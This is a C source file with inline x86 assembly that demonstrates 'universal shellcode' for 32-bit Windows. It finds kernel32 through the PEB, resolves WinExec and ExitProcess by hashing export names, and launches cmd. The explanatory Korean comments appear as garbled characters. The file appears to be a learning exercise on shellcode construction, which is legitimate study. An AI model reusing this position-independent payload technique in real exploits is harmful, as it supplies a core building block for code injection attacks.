
/*
bool define
*/
#include <stdio.h>
#include <windows.h>


#define TRUE 1
#define FALSE 0

/*
SW_SHOW value is for using WinExec API

UINT WinExec(
  LPCSTR lpCmdLine,
  UINT   uCmdShow
);

UINT: unsigned int
LPCSTR: long pointer constant string (const char *)
...

unsigned int WinExec(
	const char *lpCmdLine,
	unsigned int uCmdShow
);

*/
#define SW_SHOW 5

/*

purpose:		universal-shellcode
programmer:	woohyuk seo (������)
doc write date: 	12/19/2019
compiler: 	Visual Studio 2019 C++

universal shellcode�� kernel32.dll�� export�ϴ� �ּҰ� �Ź� �ٲ� call�ϴ� �ּҰ� ��ȿ���� �ʰԵȴ�
�������� ������� �Ϲ����� ���ڵ��� �Ѱ踦 �غ��ϱ� ���ؼ� ���������.

kenrel32.dll�� process�� mapping�Ǿ�����, �ش� kernel32.dll�� ������
�Լ��� �ּҸ� ����Ѵ�.

kernel32.dll�� mapping�� ���� PEB����Ѵ�.

����..

universal shellcode�� ����� ���ؼ� PEB(process environment block)�� ��ġ�� ���ؾ��Ѵ�.
PEB�� ��ġ�� ���ϴ� �������� fs register�� �̿��Ѵ�.

user mode�� fs register�� ���� ���μ����� TEB(thread environment block) �� ����Ű���ִ�.
kernel mode�� fs register�� KPCR (processor control region) �� ����Ű���ִ�. (�տ� �ٴ� K�� ���� kernel�� ���ڰ���.)
KPCR�� schedule info���� ����ȴ�. (����� ��������� ������, ť ����, ... ��� �Ѵ�.


fs:0x30��ġ�� PEB�� �����Ѵ�.
������ ������ ����.

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  BYTE                          Reserved4[104];
  PVOID                         Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved6[128];
  PVOID                         Reserved7[1];
  ULONG                         SessionId;
} PEB, *PPEB;

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];	//sizeof(unsigned char) = 1,  sizeof(unsigned char) * 8 = 8
  PVOID      Reserved2[3];	//sizeof(void *) = 4, sizeof(void *) * 2 = 8

  //distance = (8 + 8 + 4) = 20 byte ( InMemoryOrderModuleList.Flink )

  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

PEB���� (2 + 1 + 1 + 4 + 4 = 12) ��ŭ ���ϸ� PPEB_LDR_DATA Ldr (������ ����)�� �ּҰ� ����
Loade_export�� ����Ű�� �ּҿ���, (8 + (4 * 3) = 20)  ��ŭ ���ϸ� LIST_ENTRY InMemoryOrderModuleList �� �ּҰ� ����
InMemoryOrderModuleList �� ���߸�ũ�� ������ �ִ�.

������ ������ ����
.
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

FLink�� Front Link, BLink�� Back Link��� ���� (�� ������ ��ũ�� NULL�� ����Ű������)


���� ��ũ�� LDR_DATA_TABLE_ENTRY�� ����Ű���ִ�.
LDR_DATA_TABLE_ENTRY�� �ش� ���μ����� �ε��� DLL�� ������ �������ִ�.

������ ������ ����.

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

���⼭ �����ؾ� �� ����, Reserved1������� ������� �ʰ�, InMemoryOrderLinks���� ����Ͽ�,  ((4 * 2) + (4 * 2)) = 16byte��ŭ ���Ͽ� DllBase�� �����ؾ� �Ѵٴ� ���̴�.
������ InMemoryOrderLinks�� ���߸���Ʈ�̴�, �翬�� ���������, Front Link���� �����ɰ��̴�.
Front Link���� ���������� 32��Ʈȯ�濡���� �޸��ּ�ũ�� (4byte) 4�� �ڿ� DllBase�� �����Ѵ�.

DllBase�� mapping�� DLL�� �ּҸ� �������ִ�.

DllBase�� ����Ű�� �ּҸ� register�� ������Ű�� ����� �������� ����ؾ��Ѵ�.
mov�� ��������, ������ 4����Ʈ��ŭ �����Ѵ�. (movzx, movsx, movs)���� ����� 4����Ʈ���� ���ų�, ū ����Ʈ�� �����Ѵ�.
intel��������, 4����Ʈ �������� ǥ���� ������ ����. mov register, [register]
DllBase�� LPVOID���������� mov�� ����Ѵ�.

C�� �Լ�����, ebp �������ͷ� ���� ������ �����ϸ� �Լ����ڰ���, ������ �����ϸ� local variable area �� ���´�.

GetApiAddress �Լ��� ȣȯ���� �̽ļ��� ���ؼ� ���ܵд�.
int GetApiAddress(int ModuleAddress, const char* Name)
{
	int r = 0;

	__asm
	{
		mov edi, [ebp + 8]; //ModuleAddress

		//Image dos header
		//0x3C offset pointing value is 0xE8
		//0xE8 value means 'Offset to new EXE header' *(PE..)
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY

		mov [ebp - 12], edx;

	//get string hash

		xor eax, eax;
		xor ecx, ecx;

		xor esi, esi;

		mov ebx, [ebp + 12];

	_NAME_HASH:;
		movsx edx, byte ptr[ebx + ecx];
		add ecx, 1;
		add eax, edx;

		cmp edx, esi;
		jne _NAME_HASH;

		mov [ebp - 16], eax;


	//find api name

		mov eax, [ebp - 12];
		add eax, 32;
		mov eax, [eax];
		add eax, [ebp + 8];

		xor esi, esi;

	_LOOP:;
		mov ebx, [eax + esi * 4];
		add ebx, [ebp + 8];

		xor ecx, ecx;
		xor edi, edi;

	__LOOP:;
		movsx edx, byte ptr[ebx + ecx];

		add edi, edx;
		add ecx, 1;

		cmp edx, 0;
		jne __LOOP;

		cmp edi, [ebp - 16];
		je BREAK_LABLE;

		add esi, 1;

		jmp _LOOP;

	BREAK_LABLE:;

		//get ordinal number of the function

		mov ebx, [ebp - 12];
		add ebx, 36;
		mov ebx, [ebx];

		mov eax, 2;
		mov ecx, esi;
		mul ecx;

		add ebx, eax;
		add ebx, [ebp + 8];

		movsx edx, word ptr[ebx];

		//ordinal is started from one
		add edx, 1;

		//get function address
		mov ebx, [ebp - 12];
		add ebx, 28;
		mov ebx, [ebx];

		add ebx, [ebp + 8];

		mov eax, 4;
		mul edx;
		sub eax, 4;

		add ebx, eax;

		mov ebx, [ebx];
		add ebx, [ebp + 8];

		mov eax, ebx;
		mov r, ebx;
	}

	return r;
}
*/


/*
	example for calculating hash

	const char kernel32_string[] = "KERNEL32.DLL";
	int kernel32_string_hash = 0;

	for (int i = 0; kernel32_string[i] != 0; i++)
	{
		kernel32_string_hash += kernel32_string[i];
	}

	//kernel32_string_hash is 816 (decimal);
*/


int _WinExec;
int _ExitProcess;

int main()
{
	__asm
	{
		push ebp;
		sub esp, 64;

		//eax �������Ϳ� PEB����
		mov eax, fs:0x30;

		//PEB�κ��� 12���� �ּҴ� LDR, �������� ���ؼ� ����� ����
		mov eax, [eax + 12];
		//������� 20��ŭ ���ϸ�, LIST_ENTRY InMemoryOrderModuleList�̴�. �������� ���ؼ� Flink�� �����Ѵ�.
		mov eax, [eax + 20];

		//FLINK�� ���ؼ� entry�� �����Ѵ�. 
		//doubly linked list������ �������� ���ؼ� ���� entry�� �����Ҽ��ִ�.
		mov eax, [eax];
		mov eax, [eax];

		//���������� ���� �ּ� (MZ)�� ���Ѵ�. flink�� �̿��� �� entry�� ���� 16���� �ּҿ� �ִ�.
		mov ebx, [eax + 16];

		//module address
		mov[ebp - 24], ebx;

		mov edi, ebx;

		//DOS to NT
		mov eax, [ebx + 0x3c];
		add eax, ebx;

		//NT to Export Table
		mov eax, [eax + 120];
		add eax, ebx;

		//export table..

		//number of names
		mov ecx, [eax + 24];
		mov[ebp - 8], ecx;

		//Export Address Table
		mov ecx, [eax + 28];
		mov[ebp - 12], ecx;

		//Export Name Table	
		mov ecx, [eax + 32];
		mov[ebp - 16], ecx;

		//Export Ordinal Table
		mov ecx, [eax + 36];
		mov[ebp - 20], ecx;


		jmp SHELLCODE_MAIN;

	_GetProcAddress:;
		//eax is function name hash
		//edi is return value
		//The return value is exported function's address of the kernel32.dll

		//ebp - 16 is holds NPT
		mov ebx, [ebp - 16];

		//NPT rva to va

		add ebx, [ebp - 24];

		xor edi, edi;

	_GetFunctionName:;
		mov edx, [ebx];
		add edx, [ebp - 24];

		xor esi, esi;

	_GetNameHash:;
		movsx ecx, byte ptr[edx];
		add edx, 1;

		add esi, ecx;

		cmp ecx, 0;
		jne _GetNameHash;

		add edi, 1;
		add ebx, 4;

		cmp edi, [ebp - 8];
		je _GetProcAddressRet;

		cmp esi, eax;
		jne _GetFunctionName;

		sub edi, 1;

		// index * 2;
		mov eax, 2;
		mul edi;
		//eax holds mul operation result		

		mov ebx, [ebp - 20];
		add ebx, eax;
		add ebx, [ebp - 24];

		movsx ecx, word ptr[ebx];

		mov eax, 4;
		mul ecx;

		//export address table
		mov edi, [ebp - 12];

		//get EAT
		add edi, eax;
		add edi, [ebp - 24];

		mov edi, [edi];
		add edi, [ebp - 24];

	_GetProcAddressRet:;

		ret;

	SHELLCODE_MAIN:;
		//edi holds function address

		//cmd null-terminate string
		xor eax, eax;
		mov[ebp + 0xc], eax;
		mov[ebp + 0xc], 0x63;
		mov[ebp + 0xd], 0x6d;
		mov[ebp + 0xe], 0x64;

		mov eax, 0x2b3;
		call _GetProcAddress;

		lea ecx, [ebp + 0xc];

		xor eax, eax;
		push eax;
		push ecx;
		call edi;

		mov eax, 0x479;
		call _GetProcAddress;

		push 1;
		call edi;

		add esp, 64;
		pop ebp;
	}

	return 0;
}